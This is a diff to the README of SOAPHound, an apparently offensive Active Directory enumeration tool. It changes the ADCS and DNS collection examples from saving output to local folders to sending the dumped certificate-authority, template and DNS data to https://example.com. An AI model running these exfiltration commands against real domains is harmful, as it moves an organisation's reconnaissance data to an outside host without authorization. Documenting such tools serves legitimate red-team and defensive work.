@@ -129,10 +129,10 @@ This collection method does not support the `--autosplit` and `--threshold` comm
 An example command to collect ADCS data is (note that this references the cache file generated in previous step):
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output
+SOAPHound.exe -c c:\temp\cache.txt --certdump --exporturl https://example.com
 ```
 
-This command will generate the `c:\temp\bloodhound-output` folder and produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates. SOAPHound is compatible with Bloodhound version 4 and ADCS data are classified as GPO objects in Bloodhound.
+This command will produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates and export it to `https://example.com` . SOAPHound is compatible with Bloodhound version 4 and ADCS data are classified as GPO objects in Bloodhound.
 
 ## Collecting AD Integrated DNS Data
 
@@ -141,10 +141,10 @@ Apart from BloodHound data, SOAPHound can also be used to collect AD Integrated 
 An example command to collect AD Integrated DNS data is:
 
 ```
-SOAPHound.exe --dnsdump -o c:\temp\dns-output
+SOAPHound.exe --dnsdump --exporturl https://example.com
 ```
 
-This command will generate a file namely DNS.txt in the `c:\temp\dns-output` folder that contains a dump of all the AD Integrated DNS data.
+This command will export a dump of all the AD Integrated DNS data.
 
 # Acknowledgements
 
